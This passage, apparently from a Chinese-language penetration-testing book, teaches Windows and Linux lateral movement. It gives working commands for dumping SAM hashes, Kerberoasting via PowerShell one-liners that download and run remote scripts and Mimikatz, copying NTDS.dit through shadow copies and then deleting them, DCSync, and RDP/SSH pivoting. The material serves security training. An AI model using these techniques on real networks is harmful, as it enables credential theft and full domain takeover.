Comment           Built-in account for administering the computer/domain
User's comment
Country/region code 000 (System Default)
Account active      Yes
Account expires      Never
如果我们看到该账户处于活动状态，那么可以尝试从本地计算机中提取所有散列值。记住，这不包括任何域用户的散列。
Empire Module: powershell/credentials/powerdump
Metasploit Module
例子如下。
(Empire: powershell/credentials/powerdump) > execute
Job started: 93Z8PE
输出如下。
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3710b46790763e07 ab0d2b6cfc4470c1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59 d7e0c089c0:::
我们可以使用Empire（credentials/mimikatz/pth）工具，或者启动可信工具PsExec，提交我们的散列值，然后执行我们的自定义静荷，如图4.38所示。
图4.38
如同上文所述，这是旧的横向移动攻击方式，目前已经很难找到适合的攻击条件。如果您仍然可以看到使用本地管理员账户的情况，但环境中启用了 LAPS（本地管理员密码解决方案）方案，那么您可以使用几种不同的工具从活动目录中提取散列值。这是在假设您已经拥有特权域管理员或帮助台类型账户的情况下。
4.8.8 从服务账户获取凭证
如果您发现获取的用户账户受限，无法从内存中获取密码，并且恰好没有在主机系统上获取密码，那么该怎么办？您接下来要做什么？好吧，我比较喜欢使用的一种攻击方法是Kerberoasting。
我们都知道，由于NTLM采用单向函数没有附带盐值，存在重放攻击和其他传统的问题，因此许多公司转而采用Kerberos。众所周知，Kerberos是一种用于验证计算机网络中服务请求的安全方法。我们不会深入研究Windows中Kerberos的实现方法。但是，您应该知道域控制器通常充当票证授予服务器；并且网络上的用户可以请求票证，从而获得资源的访问权限。
什么是Kerberoast攻击？作为攻击者，我们可以用之前提取的目标服务账户的任何SPN，请求Kerberos服务票证。该漏洞的存在有以下原因：当从域控制器请求服务票证时，该票证使用关联的服务用户的NTLM散列进行加密。由于任何用户都可以请求票证，因此这意味着如果可以猜中关联服务用户的NTLM散列（加密票证）的密码，那么我们就可以获得实际服务账户的密码。这听起来可能有点混乱，下面我们来看一个例子。
与之前的情况类似，我们可以列出所有 SPN 服务，提取这些服务账户所有的 Kerberos票证。
setspn -T cyberspacekittens.local -F -Q \*/\*
我们既可以针对单用户，又可以提取所有的Kerberos票证到用户内存中。
针对单用户。 
powershell Add-Type -AssemblyName System.IdentityModel; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken- ArgumentList "HTTP/ CSK-GITHUB.cyberspacekittens.local"
提取所有的用户票证到内存中。 
powershell Add-Type -AssemblyName System.IdentityModel; IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/nidem/kerberoast/ master/GetUserSPNs.ps1") | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken-ArgumentList $_.ServicePrincipalName}catch{}}
当然，您也可以使用PowerSploit实现上述功能，如图4.39所示。
图4.39
如果成功，那么我们已将一个或多个不同的Kerberos票证导入到被攻击者计算机的内存中。我们现在需要一种提取票证的方法。要做到这一点，我们可以使用非常好用的功能——Mimikatz Kerberos Export，如图4.40所示。
powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString ('http://bit. ly/2qx4kuH'); Invoke-Mimikatz -Command '"""kerberos::list/export"""'
图4.40
在我们导出票证后，票证驻留在被攻击者的机器上。在开始破解票证之前，我们必须从被攻击者的系统中下载票证。记住，票证是使用服务账户的NTLM散列加密的。因此，如果可以猜到NTLM散列，我们就可以读取票证，同时也知道服务账户的密码。比较简单的破解账户的方法是使用名为tgsrepcrack的工具（JTR和Hashcat也支持破解Kerberoast，我们将很快讨论这个问题）。
使用Kerberoast破解票证。 
cd /opt/kerberoast
python tgsrepcrack.py [password wordlist] [kirbi tickets - *.kirbi]
如图4.41所示，服务账户csk-github的密码是“P @ ssw0rd！”。
图4.41
当然，Empire中有一个PowerShell模块可以为我们完成几乎所有烦琐的工作。它位于powershell/credentials/invoke_kerberoast下，如图4.42所示。您可以以John the Ripper或者Hashcat格式输出，从而可以使用这两个工具破解密码。我以前在大的网络环境中运行PowerShell脚本时，遇到了一些问题，因此只能重新使用PowerShell和Mimikatz获取所有的票证。
图4.42
4.9 转储域控制器散列
一旦我们获得域管理员的访问权限，从域控制器获取所有散列的旧方法就是，在域控制器上运行命令，使用Shadow Volume或Raw复制方法，获得Ntds.dit文件。
回顾Shadow Volume复制方法
由于我们可以访问文件系统，并且可以在域控制器上运行命令，因此作为攻击者，我们可以获取存储在Ntds.dit文件中的所有域散列值。但是，该文件不断被读/写，即使拥有系统权限，我们也没有读取或复制该文件的机会。“幸运”的是，我们可以利用Windows功能——Volume Shadow复制服务（VSS），该功能可以创建卷的快照副本。然后，我们可以从该副本中读取Ntds.dit文件并将其从机器中取出。这包括窃取Ntds.dit、System、SAM和Boot Key文件。最后，我们需要消除痕迹并删除卷副本。
C:\vssadmin create shadow/for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUM BER] \windows\ntds\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUM BER] \windows\system32\config\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUM BER] \windows\system32\config\SAM
reg SAVE HKLM\SYSTEM c:\SYS
vssadmin delete shadows/for= [/oldest |/all |/shadow=]
1．NinjaCopy
NinjaCopy（http://bit.ly/2HpvKwj）是另一个获取散列值的工具，运行在域控制器，可以用来获取Ntds.dit文件。NinjaCopy通过读取原始卷，解析NTFS结构，并从NTFS分区卷复制文件。这会绕过文件DACL、读句柄锁和SACL检测。您必须是管理员才能运行脚本。这可用于读取系统被锁定的文件，例如NTDS.dit文件或注册表配置单元。
Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "c:\windows\ temp\ ntds.dit"
2．DCSync
到目前为止，我们已经回顾了两个从域控制器获取散列值的旧方法，这两个方法的前提条件是您可以在域控制器上运行系统命令，并且通常在该机器上存储文件，下面我们将尝试新的方法。最近，由Benjamin Delpy和Vincent Le Toux提出的DCSync方法被多次提及，这个方法改变了域控制器导出散列的思路。DCSync实现的思路是劫持域控制器，请求该域中用户的所有散列值。仔细思考一下就会发现，这意味着，只要您具有权限，就不需要在域控制器上运行任何命令，也不必在域控制器上放置任何文件。
DCSync方法有效的前提是，必须拥有从域控制器中提取散列值的适当权限。通常仅限于域管理员、组织管理员、域控制器组以及具有将Replicating Changes设置为Allow（例如Replicating Changes All/Replicating Directory Changes）权限的用户，DCSync方法将允许您的用户执行此攻击。此攻击最初是在Mimikatz中实施的，可以使用以下命令进行。
Lsadump::dcsync/domain:[YOUR DOMAIN] /user:[Account_to_Pull_Hashes]
更棒的是，PowerShell Empire集成了DCSync工具，因此使用更加方便。
Empire代码：powershell/credentials/mimikatz/dcsync_hashdump。
通过查看DCSync导出的散列值，如图4.43所示，我们找到了活动目录中用户的所有NTLM散列值。另外，我们拥有krbtgt NTLM散列，这意味着我们现在（或在后续的行动中）可以实施Golden Ticket攻击。
图4.43
4.10 在虚拟专用服务器上基于远程桌面进行横向迁移
在当今世界，计算机上运行着各种下一代杀毒软件，在计算机之间使用 WMI/PowerShell Remoting/PsExec 横向迁移并不总是最佳选择。我们还看到一些组织正在记录所有Windows命令操作。为了解决所有这些问题，我们有时需要使用基本功能，实现横向迁移。使用VPS服务器的问题在于它仅提供一个没有用户界面的Shell。因此，需要将路由/代理/转发流量从攻击者主机、虚拟专用服务器、突破的主机，横向转移到下一个突破的主机，如图4.44所示。“幸运”的是，我们可以使用原生工具来完成大部分工作。
我们需要设置虚拟专用服务器，启用端口接收互联网数据，使用 PTF 配置Metasploit，并使用Meterpreter控制初始突破主机。我们可以使用Cobalt Strike或其他框架来完成此操作，但在这个例子中我们将使用Meterpreter。
我们可以使用默认的SSH客户端-L选项，实现本地端口转发。我使用的是macOS操作系统，但这也可以在Windows或Linux操作系统中完成。我们使用SSH工具和密钥连接到虚拟专用主机。我们还将在攻击主机上配置本地端口，在本例中为3389（RDP），实现该端口的任何流量转发到虚拟专用服务器。当该端口的流量转发到虚拟专用服务器时，该流量发送到虚拟专用服务器上本地的端口3389。最后，我们需要设置一个端口，监听虚拟专用服务器3389端口，并使用Meterpreter的端口转发功能，将流量路由到被攻击者的主机。
图4.44
（1）用Meterpreter静荷感染被攻击者。
（2）攻击者主机使用SSH工具，设置本地端口转发（在本地侦听端口3389），将所有流量发送到虚拟专用服务器的本地3389端口。
ssh -i key.pem ubuntu @ [VPS IP] -L 127.0.0.1:3389:127.0.0.1:3389
（3）在Meterpreter会话中，监听虚拟专用服务器的3389端口，转发流量从突破的主机横向迁移到下一个突破的主机。
portfwd add -l 3389 -p 3389 -r [Victim via RDP IP Address]
（4）在攻击者主机上，打开微软的远程桌面客户端，将连接地址设置为localhost，即127.0.0.1并输入被攻击者的凭证，实现RDP连接，如图4.45所示。
图4.45
4.11 在Linux中实现迁移
多年来，在Linux中实现迁移并没有太大的改变。通常，如果您使用的是dnscat2或Meterpreter，那么它们都支持数据转发。
dnscat2。 
listen 127.0.0.1:9999 :22
Metasploit。 
post/windows/manage/autoroute
Metasploit Socks Proxy + Proxychains。 
use auxiliary/server/socks4a
Meterpreter。 
portfwd add -l 3389 -p 3389 -r 
如果您很“幸运”地获得了 SSH Shell，那么可以通过多种方式在系统中进行迁移。我们如何获得SSH Shell？在许多情况下，一旦存在本地文件包含（LFI）或远程执行代码（RCE）漏洞，我们就可以尝试提升权限，读取/etc/shadow文件（密码破解），或者采用类似Mimikatz的攻击。
就像Windows和Mimikatz一样，Linux系统同样遇到了以明文形式存储密码的问题。@huntergregal编写的工具实现特定进程内容的转储，这些进程很可能以明文形式包含用户密码，如图4.46所示。到目前为止，虽然这个工具仅适用于有限数量的Linux系统，但是思路却适合所有的Linux系统。
图4.46
一旦从突破的主机上获得凭证，并且可以通过SSH工具实现重新登录，我们就可以在设备间建立隧道并进行迁移。SSH中有一些很棒的功能，允许执行这种迁移。
设置Dynamic Sock Proxy，使用proxychains，从主机迁移所有流量。 
ssh -D 127.0.0.1:8888 -p 22 @
单个端口的基本端口转移。 
ssh @ -L 127.0.0.1:55555::80
基于SSH的虚拟专用网络。这是一个很棒的功能，通过SSH建立第三层隧道。
4.12 权限提升
Linux 权限提升的方法绝大部分类似于Windows。我们查找存在漏洞的服务，例如可以写入文件、错误配置粘滞位、文件中的明文密码、全局可写文件、定时任务，当然还有补丁问题。
为了有效和高效地分析Linux设备权限提升的问题，可以使用一些工具完成所有的工作。
在进行任何类型的权限提升漏洞挖掘之前，首先了解Linux主机和系统的所有信息，包括用户、服务、定时任务、软件版本、弱凭证、错误配置的文件权限，甚至是Docker信息。我们可以使用一个名为LinEnum的工具完成所有琐碎的工作，如图4.47所示。
图4.47
这是一份非常详细的分析报告，涉及您想要了解的所有关于底层系统的信息，对于后面的行动非常有帮助。